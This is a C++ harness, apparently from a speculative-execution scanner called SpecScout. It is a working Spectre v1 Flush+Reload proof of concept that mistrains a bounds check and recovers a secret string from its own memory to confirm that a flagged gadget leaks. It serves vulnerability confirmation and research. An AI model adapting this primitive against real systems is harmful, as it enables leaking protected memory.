// harness.cpp — dynamic Flush+Reload confirmation for a SpecScout S1 finding.
//
// SpecScout's static pass reports candidate `a[b[i]]` gadgets. This harness
// confirms the gadget CLASS is actually exploitable on the host CPU: it builds
// the same bounds-check-bypass gadget SpecScout flags, mistrains the guard, then
// recovers a secret byte through the array2[] cache side channel. A clear
// recovery means the speculative window is real and the gadget leaks.
//
// This is the in-process confirmer (strongest where inputs are controllable, per
// the design). Driving an arbitrary external PE from a SpecScout JSON finding is
// future work; the primitive below is what such a driver would reuse.
//
// x86-64 only (clflush / rdtscp). Build: cl /O2 /std:c++17 harness.cpp
#include <cstdint>
#include <cstdio>
#include <cstring>

#if defined(_MSC_VER)
#include <intrin.h>
#else
#include <x86intrin.h>
#endif
#if defined(_WIN32)
#include <windows.h>
#endif

#define STRIDE 512
// Non-static globals + a non-inlined victim so array1_size is genuinely
// reloaded (and clflush-able) on each call, giving a real speculation window.
uint8_t  array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
size_t   array1_size = 16;
uint8_t  array2[256 * STRIDE];
const char secret[] = "SpecScout!";   // lives past array1 in memory
volatile uint8_t sink = 0;

#if defined(_MSC_VER)
#define NOINLINE __declspec(noinline)
#else
#define NOINLINE __attribute__((noinline))
#endif

// The gadget SpecScout flags as S1: a[b[i]] with a mistrainable bounds check.
NOINLINE static void victim(size_t x) {
    if (x < array1_size)
        sink = array2[array1[x] * STRIDE];
}

static inline uint64_t probe(volatile uint8_t* p) {
    unsigned aux; _mm_mfence(); _mm_lfence();
    uint64_t t0 = __rdtscp(&aux); _mm_lfence();
    (void)*p; _mm_lfence();
    uint64_t t1 = __rdtscp(&aux); _mm_lfence();
    return t1 - t0;
}

static int threshold() {
    volatile uint8_t* p = &array2[0]; *p = 1;
    uint64_t hit = 0, miss = 0; const int N = 10000;
    for (int i = 0; i < N; i++) { (void)*p; hit += probe(p); }
    for (int i = 0; i < N; i++) { _mm_clflush((void*)p); _mm_mfence(); miss += probe(p); }
    hit /= N; miss /= N;
    printf("[calib] cached ~%llu  uncached ~%llu cyc\n",
           (unsigned long long)hit, (unsigned long long)miss);
    return (miss <= hit + 20) ? (int)(hit + 40) : (int)(hit + (miss - hit) / 4);
}

static uint8_t leak_byte(size_t mal_x, int thr, int* score_out) {
    static int results[256];
    memset(results, 0, sizeof(results));
    for (int tries = 999; tries > 0; tries--) {
        for (int i = 0; i < 256; i++) _mm_clflush(&array2[i * STRIDE]);
        _mm_mfence();
        size_t train = tries % array1_size;
        for (int j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++) {}
            size_t x = ((j % 6) - 1) & ~0xFFFFull;  // ~0 every 6th iter, else 0
            x = (x | (x >> 16));
            x = train ^ (x & (mal_x ^ train));       // branchless select
            victim(x);
        }
        uint64_t best = ~0ull; int best_i = -1;
        int exclude = array1[tries % array1_size];
        for (int i = 0; i < 256; i++) {
            int mix = ((i * 167) + 13 + tries * 3) & 255;  // rotate vs prefetcher
            if (mix == exclude) continue;
            uint64_t t = probe(&array2[mix * STRIDE]);
            if (t < best) { best = t; best_i = mix; }
        }
        if (best_i >= 0 && (int)best <= thr) results[best_i]++;
    }
    int top = 0;
    for (int i = 1; i < 256; i++) if (results[i] > results[top]) top = i;
    *score_out = results[top];
    return (uint8_t)top;
}

int main() {
#if defined(_WIN32)
    SetThreadAffinityMask(GetCurrentThread(), 1ull << 2);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
#endif
    for (size_t i = 0; i < sizeof(array2); i++) array2[i] = 1;  // map pages
    int thr = threshold();
    size_t mal = (size_t)((intptr_t)secret - (intptr_t)array1);
    int len = (int)sizeof(secret) - 1, ok = 0;
    printf("[confirm] attacking flagged S1 gadget, recovering %d-byte secret:\n", len);
    for (int i = 0; i < len; i++) {
        int score = 0;
        uint8_t v = leak_byte(mal + i, thr, &score);
        char c = (v > 31 && v < 127) ? (char)v : '?';
        bool good = score >= 5;
        if (good && c == secret[i]) ok++;
        printf("  byte %2d: 0x%02X '%c'  hits=%d  %s\n", i, v, c, score,
               good ? "" : "(weak)");
    }
    printf("\n[confirm] recovered %d/%d bytes -> gadget is %s\n", ok, len,
           ok >= len - 1 ? "EXPLOITABLE (leak confirmed)" : "not confirmed on this run");
    return ok >= len - 1 ? 0 : 1;
}
